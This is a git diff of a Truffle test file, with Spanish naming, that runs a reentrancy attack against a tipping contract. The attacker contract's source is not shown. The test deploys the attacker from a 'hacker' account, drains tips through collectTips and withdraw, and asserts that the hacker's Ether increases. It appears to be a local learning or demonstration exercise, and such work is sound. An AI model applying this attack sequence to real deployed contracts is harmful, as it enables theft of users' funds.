@@ -5,26 +5,17 @@ require('chai')
   .use(require('chai-as-promised'))
   .should()
 
-contract('Reentracny attack ', accounts => {
+contract('Reentracny attack ', ([deployer, donador, mozo, camarera, hackerAccount, giverA, giverB, ...accounts ]) => {
   let propinas;
-  let atacante;
+  let atacanteInstance;
 
   before(async () => {
     propinas = await Propinas.deployed();
-    atacante = await Atacante.deployed();
   })
 
-  describe('Attaaack', async () => {
-    it.only('Should be able to steal all Ether', async () => {
-      let balnce;
-      const tip = 10000000000000000000;
-      // Accounts alias
-      const donador = accounts[1];
-      const mozo = accounts[2];
-      const camarera = accounts[3];
-      const hackerMan = accounts[4];
-      const giverA = accounts[5];
-      const giverB = accounts[6];
+  describe('Attack', async () => {
+    it('Should be able to steal all Ether', async () => {
+      const tip = web3.utils.toWei('1', "ether");
       
       // Fresh start
       await Propinas.new(); // Accounts[0] is default for transactions
@@ -36,8 +27,8 @@ contract('Reentracny attack ', accounts => {
       let initialBalanceCamarera = await propinas.balanceOf(camarera);
       assert.equal(initialBalanceCamarera, 0);
 
-      let initialBalanceHackerMan = await propinas.balanceOf(hackerMan);
-      assert.equal(initialBalanceHackerMan, 0);
+      let hackerInitialBalance = await propinas.balanceOf(hackerAccount);
+      assert.equal(hackerInitialBalance, 0);
 
       // Give tips to employees
       await propinas.sendTip(mozo, { from: donador, value: tip}); 
@@ -49,32 +40,36 @@ contract('Reentracny attack ', accounts => {
       assert.equal(balance, tip);
 
       // Give more tips to employees
-      for (let i = 0; i < 13; i++) {
+      for (let i = 0; i < 72; i++) {
         await propinas.sendTip(i % 2 ? mozo: camarera, 
           { from: i % 3 ? giverA : giverB, value: tip}); 
       };
 
-
       // At some point, Hackerman gets ready to strike
-      atacante = await Atacante.new( Propinas.address ,{ from: hackerMan }); 
+      console.log('ETH en Hacker address al iniciar: ', web3.utils.fromWei(await web3.eth.getBalance(hackerAccount)));
+      const hackerInitialEther = await web3.eth.getBalance(hackerAccount);
+      atacanteInstance = await Atacante.new( Propinas.address ,{ from: hackerAccount });
+      console.log('ETH en Hacker address después de deploy: ', web3.utils.fromWei(await web3.eth.getBalance(hackerAccount)));
 
       // AutoGive a Tip
-      await propinas.sendTip(Atacante.address, { from: hackerMan, value: 10000000}); // A really small amount needed to start the attack
-      initialBalanceHackerMan = await propinas.balanceOf(hackerMan);
-      assert.notEqual(Atacante.address, 0);
+      await propinas.sendTip(
+        atacanteInstance.address, 
+        { from: hackerAccount, value: web3.utils.toWei('1', "ether")}
+      );
+      console.log('ETH en Hacker address después de tip al SC:', web3.utils.fromWei(await web3.eth.getBalance(hackerAccount)));
+      console.log('Propinas inicial ETH:', web3.utils.fromWei(await web3.eth.getBalance(propinas.address)));
+      console.log('ETH en Propinas asginadas al SC:', web3.utils.fromWei(await propinas.getBalanceOf(atacanteInstance.address)).toString());
+      console.log('ETH en Propinas asignadas al Hacker:', web3.utils.fromWei(await propinas.getBalanceOf(hackerAccount)).toString());
+      
 
-      // Steal all 5503566
-      const hackerInitialBalance = await web3.eth.getBalance(hackerMan);
-      console.log('hackerInitialBalance', hackerInitialBalance);
+      await atacanteInstance.collectTips({from: hackerAccount});
+      let hackerEther = await web3.eth.getBalance(hackerAccount);
+      console.log('Hacker ETH despues del ataque:', web3.utils.fromWei(await web3.eth.getBalance(hackerAccount)));
 
-      const attackTx = await atacante.collectTips();
-      let hackerBalance = await web3.eth.getBalance(hackerMan);
-      console.log(hackerBalance);
-
-      const withdrawTx = await atacante.withdraw();
-      hackerBalance = await web3.eth.getBalance(hackerMan);
-      console.log(hackerBalance);
-
+      await atacanteInstance.withdraw({from: hackerAccount});
+      hackerEther = await web3.eth.getBalance(hackerAccount);
+      console.log('Hacker ETH despues del withdraw:', web3.utils.fromWei(await web3.eth.getBalance(hackerAccount)));
+      assert.equal(hackerEther > hackerInitialEther, true);
     });
   });
 });
